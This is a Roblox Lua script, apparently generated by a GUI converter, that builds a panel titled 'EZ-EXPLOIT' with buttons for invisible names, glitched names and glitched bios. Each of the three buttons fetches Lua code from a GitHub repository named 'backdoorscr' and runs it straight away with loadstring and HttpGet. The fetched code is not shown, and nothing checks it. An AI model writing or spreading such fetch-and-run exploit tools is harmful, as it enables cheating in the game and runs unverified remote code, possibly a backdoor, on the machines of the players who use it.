--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 18 | Scripts: 5 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 236, 0, 150);
G2L["2"]["Position"] = UDim2.new(0.0403, 0, 0.37874, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["BackgroundTransparency"] = 0.375;


-- StarterGui.ScreenGui.Frame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.ScreenGui.Frame.Topbar
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(86, 86, 86);
G2L["4"]["Size"] = UDim2.new(0, 236, 0, 20);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Name"] = [[Topbar]];


-- StarterGui.ScreenGui.Frame.Topbar.UICorner
G2L["5"] = Instance.new("UICorner", G2L["4"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 2);


-- StarterGui.ScreenGui.Frame.Topbar.TextLabel
G2L["6"] = Instance.new("TextLabel", G2L["4"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 114, 0, 20);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[EZ-EXPLOIT]];


-- StarterGui.ScreenGui.Frame.Topbar.Close
G2L["7"] = Instance.new("TextButton", G2L["4"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["7"]["BackgroundTransparency"] = 0.5;
G2L["7"]["Size"] = UDim2.new(0, 31, 0, 20);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[X]];
G2L["7"]["Name"] = [[Close]];
G2L["7"]["Position"] = UDim2.new(0.86864, 0, 0, 0);


-- StarterGui.ScreenGui.Frame.Topbar.Close.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.Frame.Topbar.drag
G2L["9"] = Instance.new("LocalScript", G2L["4"]);
G2L["9"]["Name"] = [[drag]];


-- StarterGui.ScreenGui.Frame.InvisName
G2L["a"] = Instance.new("TextButton", G2L["2"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/DenkOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["BackgroundTransparency"] = 0.15;
G2L["a"]["Size"] = UDim2.new(0, 187, 0, 35);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Invisible Name]];
G2L["a"]["Name"] = [[InvisName]];
G2L["a"]["Position"] = UDim2.new(0.10169, 0, 0.20667, 0);


-- StarterGui.ScreenGui.Frame.InvisName.UICorner
G2L["b"] = Instance.new("UICorner", G2L["a"]);



-- StarterGui.ScreenGui.Frame.InvisName.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Frame.GlitchName
G2L["d"] = Instance.new("TextButton", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 14;
G2L["d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/DenkOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["BackgroundTransparency"] = 0.15;
G2L["d"]["Size"] = UDim2.new(0, 187, 0, 35);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[Glitchy Name]];
G2L["d"]["Name"] = [[GlitchName]];
G2L["d"]["Position"] = UDim2.new(0.10169, 0, 0.48667, 0);


-- StarterGui.ScreenGui.Frame.GlitchName.UICorner
G2L["e"] = Instance.new("UICorner", G2L["d"]);



-- StarterGui.ScreenGui.Frame.GlitchName.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["d"]);



-- StarterGui.ScreenGui.Frame.GlitchBio
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/DenkOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["BackgroundTransparency"] = 0.15;
G2L["10"]["Size"] = UDim2.new(0, 187, 0, 26);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Glitched Bio]];
G2L["10"]["Name"] = [[GlitchBio]];
G2L["10"]["Position"] = UDim2.new(0.10169, 0, 0.76667, 0);


-- StarterGui.ScreenGui.Frame.GlitchBio.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);



-- StarterGui.ScreenGui.Frame.GlitchBio.LocalScript
G2L["12"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.ScreenGui.Frame.Topbar.Close.LocalScript
local function C_8()
local script = G2L["8"];
	local button = script.Parent
	local frame = button.Parent.Parent
	
	button.MouseButton1Click:Connect(function()
		frame:Destroy()
	end)
end;
task.spawn(C_8);
-- StarterGui.ScreenGui.Frame.Topbar.drag
local function C_9()
local script = G2L["9"];
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	
	local topbar = script.Parent
	local frame = topbar.Parent
	
	local dragging = false
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		local newPosition = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
		frame.Position = newPosition
	end
	
	topbar.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	topbar.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragging then
				update(input)
			end
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			update(input)
		end
	end)
	
end;
task.spawn(C_9);
-- StarterGui.ScreenGui.Frame.InvisName.LocalScript
local function C_c()
local script = G2L["c"];
	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(
			game:HttpGet(
				'https://raw.githubusercontent.com/backdoorscr/lua/refs/heads/main/CLR/InvisName.lua'
			)
		)()
	end)
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Frame.GlitchName.LocalScript
local function C_f()
local script = G2L["f"];
	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(
			game:HttpGet(
				'https://raw.githubusercontent.com/backdoorscr/lua/refs/heads/main/CLR/buggedname.lua'
			)
		)()
	end)
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame.GlitchBio.LocalScript
local function C_12()
local script = G2L["12"];
	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(
			game:HttpGet(
				'https://raw.githubusercontent.com/backdoorscr/lua/refs/heads/main/CLR/BuggedBio.lua'
			)
		)()
	end)
end;
task.spawn(C_12);

return G2L["1"], require;
